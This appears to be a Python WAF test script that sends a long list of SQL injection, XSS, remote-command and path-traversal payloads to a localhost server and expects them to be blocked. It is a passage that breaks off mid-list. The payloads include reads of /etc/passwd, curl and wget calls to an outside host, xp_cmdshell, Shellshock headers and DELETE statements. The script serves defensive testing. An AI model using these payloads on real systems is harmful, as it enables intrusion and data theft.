#!/usr/bin/env python3

import subprocess
import urllib.parse
import datetime
import argparse

# Configuration
TARGET_URL = 'http://localhost:8080'
TIMEOUT = 8
OUTPUT_FILE = "waf_test_results.log"
DEFAULT_USER_AGENT = "WAF-Test-Script/1.0" # Default User-Agent

# Colors for output
GREEN = '\033[0;32m'
RED = '\033[0;31m'
BLUE = '\033[0;34m'
YELLOW = '\033[0;33m'
NC = '\033[0m'

def test_url(url, description, expected_code, headers=None, body=None, default_user_agent=None):
    url_encoded = urllib.parse.quote(url, safe=':/?=&')
    curl_cmd = [
        'curl', '-s', '-k', '-w', '%{http_code}', '--connect-timeout', str(TIMEOUT),
        '--max-time', str(TIMEOUT), '-o', '/dev/null'
    ]

    if headers:
        headers_to_use = headers.copy()
        if 'User-Agent' not in headers_to_use and default_user_agent:
                headers_to_use['User-Agent'] = default_user_agent
    elif default_user_agent:
            headers_to_use = {'User-Agent': default_user_agent}
    else:
        headers_to_use = None



    if headers_to_use:
        for key, value in headers_to_use.items():
             curl_cmd.extend(['-H', f"{key}: {value}"])


    if body:
        curl_cmd.extend(['-d', body])

    curl_cmd.append(url_encoded)

    try:
        process = subprocess.run(curl_cmd, capture_output=True, text=True, check=False)
        response = process.stdout.strip()
        curl_status = process.returncode

        if curl_status != 0:
            print(f"{RED}[!]{NC} {description:<70} [CURL Error: {curl_status}]")
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"[ERROR] {description} - URL: {url}, Headers: {headers_to_use}, Body: {body}, Expected: {expected_code}, CURL Status: {curl_status}\n")
            return False

        if response == str(expected_code):
            print(f"{GREEN}[✓]{NC} {description:<70} [{response}]")
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"[PASS] {description} - URL: {url}, Headers: {headers_to_use}, Body: {body}, Expected: {expected_code}, Got: {response}\n")
            return True
        else:
            print(f"{RED}[✗]{NC} {description:<70} [{response}] (Expected: {expected_code})")
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"[FAIL] {description} - URL: {url}, Headers: {headers_to_use}, Body: {body}, Expected: {expected_code}, Got: {response}\n")
            return False

    except Exception as e:
        print(f"{RED}[!] {description:<70} [Exception: {e}]{NC}")
        with open(OUTPUT_FILE, "a") as f:
            f.write(f"[ERROR] {description} - URL: {url}, Headers: {headers_to_use}, Body: {body}, Expected: {expected_code}, Exception: {e}\n")
        return False

test_cases = [
    # SQL Injection (SQLi) Tests
    ("SQLi", f"{TARGET_URL}/?q=1", "SQLi (Level 1) - Basic Parameter", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'", "SQLi (Level 2) - Single Quote", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' -- -", "SQLi (Level 3) - Comment Injection", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' OR '1'='1", "SQLi (Level 4) - Simple OR Bypass", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND 1=1", "SQLi (Level 5) - Simple AND Bypass", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1; SELECT 1--", "SQLi (Level 6) - Statement Terminator", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=union select null,null--", "SQLi (Level 7) - Basic Union", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=union/*comment*/select null,null--", "SQLi (Level 8) - Union with Comment", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=un/**/ion select null,null--", "SQLi (Level 9) - Union with Inline Comment", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=%2575nion select null,null--", "SQLi (Level 10) - Union URL Encoded", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' ORDER BY 1--", "SQLi (Level 11) - Order By Clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' GROUP BY 1--", "SQLi (Level 12) - Group By Clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' HAVING 1=1--", "SQLi (Level 13) - Having Clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1;EXEC xp_cmdshell 'dir'--", "SQLi (Level 14) - xp_cmdshell", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1;CREATE TABLE test (id INT)--", "SQLi (Level 15) - CREATE TABLE", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; INSERT INTO users (username) VALUES ('test')--", "SQLi (Level 16) - INSERT Statement", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; UPDATE users SET username = 'test' WHERE id = 1--", "SQLi (Level 17) - UPDATE Statement", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; DELETE FROM users WHERE id = 1--", "SQLi (Level 18) - DELETE Statement", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND (SELECT COUNT(*) FROM users)=1--", "SQLi (Level 19) - Subquery", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND EXISTS (SELECT * FROM users)--", "SQLi (Level 20) - EXISTS Clause", 403, None, None),
     ("SQLi", f"{TARGET_URL}/?q=1' AND ASCII(SUBSTR((SELECT USER()),1,1))>1--", "SQLi (Level 21) - Blind SQL (ASCII)", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND LENGTH((SELECT USER()))>1--", "SQLi (Level 22) - Blind SQL (Length)", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1; IF (1=1) SELECT 1 ELSE SELECT 0;--", "SQLi (Level 23) - Conditional Statement", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--", "SQLi (Level 24) - Case Statement", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=SLEEP(5)", "SQLi (Level 25) - Time-Based Blind", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1 AND benchmark(5000000,MD5('A'))--", "SQLi (Level 26) - MySQL Time-Based", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=CAST(1 AS INT)", "SQLi (Level 27) - Data Type Conversion", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=CONVERT(INT,1)", "SQLi (Level 28) - Data Type Conversion (MSSQL)", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=EXTRACTVALUE(xmltype('<x><y>1</y></x>'),'/x/y')", "SQLi (Level 29) - Error-Based (XML)", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=CTXSYS.DRITHSX.SN(user_tables,'1=1')", "SQLi (Level 30) - Oracle Error-Based", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; SHOW DATABASES;--", "SQLi (Level 31) - MySQL Stacked Query", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; EXEC sp_databases;--", "SQLi (Level 32) - MSSQL Stacked Query", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=CREATE USER testuser WITH PASSWORD 'password';", "SQLi (Level 33) - PostgreSQL Stacked Query", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=SELECT CASE WHEN (1=1) THEN to_char(current_timestamp) ELSE '' END", "SQLi (Level 34) - PostgreSQL Conditional", 403, None, None),
     ("SQLi", f"{TARGET_URL}/?q=SELECT utl_inaddr.get_host_name('localhost') FROM dual", "SQLi (Level 35) - Oracle Function Call", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=SELECT top 1 name FROM sys.databases", "SQLi (Level 36) - MSSQL Information Schema", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=SELECT table_name FROM information_schema.tables", "SQLi (Level 37) - MySQL Information Schema", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' OR 1=1 -- -", "SQLi (Level 38) - OR Bypass with Comment", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND 1=0 -- -", "SQLi (Level 39) - AND Bypass with Comment", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' /**/OR/**/1=1--", "SQLi (Level 40) - OR Bypass with Complex Comment", 403, None, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 1) - Simple Header Injection", 403, {"X-Custom-SQL": "'"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 2) - Union in Header", 403, {"X-Custom-SQL": "union select 1,2--"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 3) - Complex Union", 403, {"X-Custom-SQL": "/*!UNION*/ SELECT null, concat(0x7162717671,version(),0x716b717a71), null--"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 4) - User-Agent Injection", 403, {"User-Agent": "test' OR '1'='1"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 5) - Referer Injection", 403, {"Referer": "' OR '1'='1"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 6) - Custom Header with Union", 403, {"X-Custom-SQL-Union": "union select 1,2--"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Cookie Level 1) - Simple Cookie Injection", 403, {"Cookie": "sql_injection='"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Cookie Level 2) - Basic Union", 403, {"Cookie": "sql_injection=union select 1,2--"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Cookie Level 3) - Error Based", 403, {"Cookie": "sql_injection=1' AND (SELECT CHAR(75)||CHAR(97)||CHAR(122)||CHAR(99)||CHAR(75))>0--"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Cookie Level 4) - Cookie with OR Bypass", 403, {"Cookie": "sql_injection=1' OR '1'='1--"}, None),
    ("SQLi", f"{TARGET_URL}/", "SQLi (Cookie Level 5) - Cookie with Stacked Query", 403, {"Cookie": "sql_injection=1'; SELECT 1;--"}, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND (SELECT 1 FROM dual WHERE 1=1)--", "SQLi (Level 41) - Oracle Subquery", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1' AND (SELECT 'a' FROM (SELECT 1) AS x)--", "SQLi (Level 42) - Subquery Aliasing", 403, None, None),
     ("SQLi", f"{TARGET_URL}/?q=1'; DECLARE @a INT; SET @a = 1; SELECT @a;--", "SQLi (Level 43) - MSSQL Variable Declaration", 403, None, None),
     ("SQLi", f"{TARGET_URL}/?q=1' AND EXISTS (SELECT 1 FROM users WHERE id=1)--", "SQLi (Level 44) - EXISTS Clause with Condition", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; CALL testProcedure();--", "SQLi (Level 45) - Stored Procedure Call", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; SELECT COUNT(*) FROM users WHERE username LIKE 'a%';--", "SQLi (Level 46) - LIKE clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; SELECT * FROM users WHERE id IN (1,2);--", "SQLi (Level 47) - IN clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; SELECT * FROM users WHERE id BETWEEN 1 AND 3;--", "SQLi (Level 48) - BETWEEN clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; SELECT * FROM users WHERE id = 1 LIMIT 1;--", "SQLi (Level 49) - LIMIT clause", 403, None, None),
    ("SQLi", f"{TARGET_URL}/?q=1'; SELECT * FROM users WHERE id = 1 FETCH FIRST 1 ROWS ONLY;--", "SQLi (Level 50) - FETCH clause", 403, None, None),
  
    # Cross-Site Scripting (XSS) Tests
    ("XSS", f"{TARGET_URL}/?x=test", "XSS (Level 1) - Plain Text", 200, None, None),
    ("XSS", f"{TARGET_URL}/?x=<script>alert(1)</script>", "XSS (Level 2) - Basic Script Tag", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<img src=x onerror=alert(1)>", "XSS (Level 3) - IMG Onerror", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<img src=x οnerrοr=alert(1)>", "XSS (Level 4) - Obfuscated IMG Onerror", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=javascript:alert(1)", "XSS (Level 5) - JavaScript Protocol", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=JaVaScRiPt:alert(1)", "XSS (Level 6) - Mixed Case JavaScript Protocol", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=%3Cscript%3Ealert(1)%3C/script%3E", "XSS (Level 7) - URL Encoded Script", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=%253Cscript%253Ealert(1)%253C%252Fscript%253E", "XSS (Level 8) - Double URL Encoded", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<svg/onload=alert(1)>", "XSS (Level 9) - SVG Onload", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<svg onload='alert(1)'>", "XSS (Level 10) - SVG Onload with Quotes", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<a href=\"javascript:alert(1)\">Click</a>", "XSS (Level 11) - Anchor Tag JavaScript", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<a href=\"javascript:alert(1)\">Click</a>", "XSS (Level 12) - HTML Encoded JS", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=\"'><script>alert(1)</script>", "XSS (Level 13) - Attribute Breakout", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x='><script>alert(1)</script>", "XSS (Level 14) - Attribute Breakout (Single)", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<body onload=alert(1)>", "XSS (Level 15) - Body Onload", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<input onfocus=alert(1) autofocus>", "XSS (Level 16) - Input Onfocus Autofocus", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "XSS (Level 17) - Iframe Srcdoc HTML Encoded", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<details open ontoggle=alert(1)>", "XSS (Level 18) - Details Ontoggle", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<%2Fscript><script>alert(1)</script>", "XSS (Level 19) - Breaking Script Tag", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<details open ontoggle=\"alert(1)\">", "XSS (Level 20) - Details Ontoggle without quotes", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<iframe/src=\"data:text/html,<script>alert(1)</script>\">", "XSS (Level 21) - Iframe Data URI", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<object data=\"javascript:alert(1)\">", "XSS (Level 22) - Object Tag JavaScript Protocol", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<b οnclick=alert(1)>ClickMe</b>", "XSS (Level 23) - B Tag Onclick", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", "XSS (Level 25) - Meta Refresh", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<!--><script>alert(1)</script>", "XSS (Level 26) - HTML Comment Bypass", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<svg><script>alert(1)</script></svg>", "XSS (Level 27) - SVG Script Tag", 403, None, None),
    ("XSS", f"{TARGET_URL}/#<script>alert(1)</script>", "XSS (Level 28) - Hash Injection", 403, None, None),
     ("XSS", f"{TARGET_URL}/?x=<plaintext/οnmouseover=alert(1)>test", "XSS (Level 29) - plaintext tag", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<isindex action=javascript:alert(1)>", "XSS (Level 31) - isindex tag", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<form><button formaction=javascript:alert(1)>click</button></form>", "XSS (Level 32) - formaction attribute", 403, None, None),
   ("XSS", f"{TARGET_URL}/?x=<video><source onerror=alert(1)></video>", "XSS (Level 33) - Video Tag with Source onerror", 403, None, None),
     ("XSS", f"{TARGET_URL}/?x=<marquee onstart=alert(1)>", "XSS (Level 34) - Marquee Onstart", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<audio controls><source src=x onerror=alert(1)></audio>", "XSS (Level 35) - Audio Source Tag", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<select autofocus onfocus=alert(1)></select>", "XSS (Level 36) - Select autofocus onfocus", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<textarea onfocus=alert(1) autofocus></textarea>", "XSS (Level 37) - Textarea Autofocus", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<keygen autofocus onfocus=alert(1)>", "XSS (Level 38) - Keygen Autofocus", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\">", "XSS (Level 39) - Embed Data URI", 403, None, None),
    ("XSS", f"{TARGET_URL}/?x=<input type=\"text\" value=\"\" onmouseover=\"alert(1)\">", "XSS (Level 40) - Input Mouseover", 403, None, None),
   
    ("XSS", f"{TARGET_URL}/", "XSS (Header Level 1) - Basic Script in Header", 403, {"X-Custom-XSS": "<script>alert(1)</script>"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Header Level 2) - URL Encoded Script", 403, {"X-Custom-XSS": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Header Level 3) - Referer Injection", 403, {"Referer": "<script>alert(1)</script>"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Header Level 4) - User-Agent Injection", 403, {"User-Agent": "<script>alert(1)</script>"}, None),
     ("XSS", f"{TARGET_URL}/", "XSS (Header Level 5) - Custom Header with SVG", 403, {"X-Custom-XSS-SVG": "<svg onload=alert(1)>"}, None),
     ("XSS", f"{TARGET_URL}/", "XSS (Header Level 6) - Custom Header with data URI", 403, {"X-Custom-XSS-DATA": "data:text/html,<script>alert(1)</script>"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Cookie Level 1) - Basic Script", 403, {"Cookie": "xss=<script>alert(1)</script>"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Cookie Level 2) - HTML Encoded Script", 403, {"Cookie": "xss=<script>alert(1)</script>"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Cookie Level 3) - Double Quotes", 403, {"Cookie": 'xss="<script>alert(1)</script>"'}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Cookie Level 4) - Cookie with encoded script", 403, {"Cookie": "xss=%3Cscript%3Ealert(1)%3C/script%3E"}, None),
    ("XSS", f"{TARGET_URL}/", "XSS (Cookie Level 5) - Cookie with img tag", 403, {"Cookie": "xss=<img src=x onerror=alert(1)>"}, None),
    ("XSS", f"{TARGET_URL}", "XSS (Body Level 1) - Basic Script", 403, None, "<script>alert(1)</script>"),
    ("XSS", f"{TARGET_URL}", "XSS (Body Level 2) - URL Encoded Script", 403, None, "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
      ("XSS", f"{TARGET_URL}", "XSS (Body Level 3) - Encoded SVG", 403, None, "<svg onload=alert(1)>"),
    ("XSS", f"{TARGET_URL}", "XSS (Body Level 4) - Encoded IMG Tag", 403, None, "<img src=x onerror=alert(1)>"),
    ("XSS", f"{TARGET_URL}", "XSS (Body Level 5) - Encoded Iframe Tag", 403, None, "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"),
  
    # Remote Code Execution (RCE) Tests
    ("RCE", f"{TARGET_URL}/?cmd=whoami", "RCE (Level 1) - Simple Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=cat /etc/passwd", "RCE (Level 2) - Read File", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=ls -la", "RCE (Level 3) - List Files", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=| whoami", "RCE (Level 4) - Pipe Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=; whoami", "RCE (Level 5) - Command Separator", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=%60whoami%60", "RCE (Level 6) - Backticks", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=echo \"test\"", "RCE (Level 7) - Quoted Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=uname -a", "RCE (Level 8) - System Information", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=id", "RCE (Level 9) - User ID", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=curl http://example.com", "RCE (Level 10) - Outbound Request", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=wget http://example.com", "RCE (Level 11) - Download File", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=ping -c 1 example.com", "RCE (Level 12) - Network Utility", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=powershell.exe Get-Process", "RCE (Level 13) - PowerShell Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=python -c 'print(\"hello\")'", "RCE (Level 14) - Python Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=perl -e 'print \"hello\"'", "RCE (Level 15) - Perl Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=echo system('whoami')", "RCE (Level 16) - Echo with System", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=passthru('whoami')", "RCE (Level 17) - passthru Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=shell_exec('whoami')", "RCE (Level 18) - shell_exec Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=反引号whoami反引号", "RCE (Level 19) - Chinese Backticks", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=popen('whoami', 'r')", "RCE (Level 20) - popen Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=proc_open('whoami', array(), $pipes)", "RCE (Level 21) - proc_open Command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=assert($_GET['x'])&x=phpinfo();", "RCE (Level 22) - Assert with GET", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=eval($_POST['y'])", "RCE (Level 23) - Eval with POST", 403, None, "y=phpinfo();"),
    ("RCE", f"{TARGET_URL}/?cmd=include($_GET['file'])&file=/etc/passwd", "RCE (Level 24) - Include with GET", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=require($_POST['file'])", "RCE (Level 25) - Require with POST", 403, None, "file=/etc/passwd"),
    ("RCE", f"{TARGET_URL}/?cmd=system($_GET['c'])&c=whoami", "RCE (Level 26) - System with GET", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=exec('whoami',$output); print_r($output);", "RCE (Level 27) - Exec and print_r", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=pcntl_exec('/bin/whoami');", "RCE (Level 28) - pcntl_exec command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=mail('test@example.com', 'Test Subject', 'Test Body', 'From:attacker@example.com')", "RCE (Level 29) - Mail function", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=file_get_contents('file:///etc/passwd')", "RCE (Level 30) - file_get_contents", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=file_put_contents('/tmp/test.txt','test content');", "RCE (Level 31) - file_put_contents", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=disk_free_space('/');", "RCE (Level 32) - disk_free_space", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=ldap_connect('ldap://localhost')", "RCE (Level 33) - ldap_connect", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=gzopen('file:///etc/passwd','r');", "RCE (Level 34) - gzopen function", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=ftp_connect('ftp://localhost');", "RCE (Level 35) - ftp_connect command", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=ssh2_connect('localhost', 22);", "RCE (Level 36) - ssh2_connect function", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=imagecreatefrompng('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')", "RCE (Level 37) - imagecreatefrompng", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=assert($_GET['x'])&x=system(\"whoami\");", "RCE (Level 38) - Assert with Command Execution", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=ob_start(); system('whoami'); $output = ob_get_contents(); ob_end_clean(); print_r($output);", "RCE (Level 39) - ob_start and system", 403, None, None),
    ("RCE", f"{TARGET_URL}/?cmd=call_user_func(system,'whoami');", "RCE (Level 40) - call_user_func with system", 403, None, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Header Level 1) - Command in Header", 403, {"X-Custom-Cmd": "whoami"}, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Header Level 2) - Command with Args", 403, {"X-Custom-Cmd": "cat /etc/passwd"}, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Header Level 3) - User-Agent Command Injection", 403, {"User-Agent": "() { :; }; /usr/bin/whoami"}, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Header Level 4) - Referer Command Injection", 403, {"Referer": "() { :; }; /usr/bin/whoami"}, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Header Level 5) - Custom Header Command Execution", 403, {"X-Exec-Command": "whoami"}, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Cookie Level 1) - Command in Cookie", 403, {"Cookie": "rce_cmd=whoami"}, None),
    ("RCE", f"{TARGET_URL}/", "RCE (Cookie Level 2) - Command with Pipe", 403, {"Cookie": "rce_cmd=whoami | grep root"}, None),
     ("RCE", f"{TARGET_URL}/", "RCE (Cookie Level 3) - Command with Backticks", 403, {"Cookie": "rce_cmd=`whoami`"}, None),
     ("RCE", f"{TARGET_URL}/", "RCE (Cookie Level 4) - Command with system()", 403, {"Cookie": "rce_cmd=system('whoami')"}, None),
   ("RCE", f"{TARGET_URL}/", "RCE (Cookie Level 5) - Command with shell_exec()", 403, {"Cookie": "rce_cmd=shell_exec('ls -la')"}, None),

    # Path Traversal Tests
    ("Path Traversal", f"{TARGET_URL}/file.txt", "Path Traversal (Level 1) - Direct File", 200, None, None),
    ("Path Traversal", f"{TARGET_URL}/../etc/passwd", "Path Traversal (Level 2) - Single Up Level", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/../../etc/passwd", "Path Traversal (Level 3) - Double Up Level", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/../../../etc/passwd", "Path Traversal (Level 4) - Triple Up Level", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/../../../../etc/passwd", "Path Traversal (Level 5) - Quadruple Up Level", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/....//etc/passwd", "Path Traversal (Level 6) - Obfuscated Slashes", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%2fetc%2fpasswd", "Path Traversal (Level 7) - URL Encoded", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%252fetc%252fpasswd", "Path Traversal (Level 8) - Double Encoded", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}//etc//passwd", "Path Traversal (Level 9) - Multiple Slashes", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/.../etc/passwd", "Path Traversal (Level 10) - Triple Dot Prefix", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..../etc/passwd", "Path Traversal (Level 11) - Quadruple Dot Prefix", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%c0%afetc%c0%afpasswd", "Path Traversal (Level 12) - UTF-8 Encoded", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/....%2fetc%2fpasswd", "Path Traversal (Level 13) - Mixed Encoding", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%2e%2f..%2e%2fetc%2fpasswd", "Path Traversal (Level 14) - Mixed Dot Encoding", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/....//....//etc/passwd", "Path Traversal (Level 15) - Mixed Obfuscation", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%00/etc/passwd", "Path Traversal (Level 16) - Null Byte Injection", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Path Traversal (Level 17) - Percent Encoding", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Path Traversal (Level 18) - Double Percent Encoding", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..\\..\\..\\etc\\passwd", "Path Traversal (Level 19) - Windows Style", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/../../../../../../../../etc/passwd", "Path Traversal (Level 20) - Multiple Up Levels", 403, None, None),
     ("Path Traversal", f"{TARGET_URL}/..%255c..%255c..%255cetc%255cpasswd", "Path Traversal (Level 21) - Double Encoded Backslash", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/.../.../.../etc/passwd", "Path Traversal (Level 22) - Mixed Triple Dot Slashes", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..../..../..../etc/passwd", "Path Traversal (Level 23) - Mixed Quad Dot Slashes", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/%2e%2e%5c%2e%2e%5cetc%5cpasswd", "Path Traversal (Level 24) - Mixed Percent Backslash Encoding", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%252f..%252f..%252f..%252fetc%252fpasswd", "Path Traversal (Level 25) - Multiple Double Encoded Slashes", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/..%255c..%255c..%255c..%255cetc%255cpasswd", "Path Traversal (Level 26) - Multiple Double Encoded Backslashes", 403, None, None),
     ("Path Traversal", f"{TARGET_URL}/..%u2215etc%u2215passwd", "Path Traversal (Level 27) - Unicode Encoded Slash", 403, None, None),
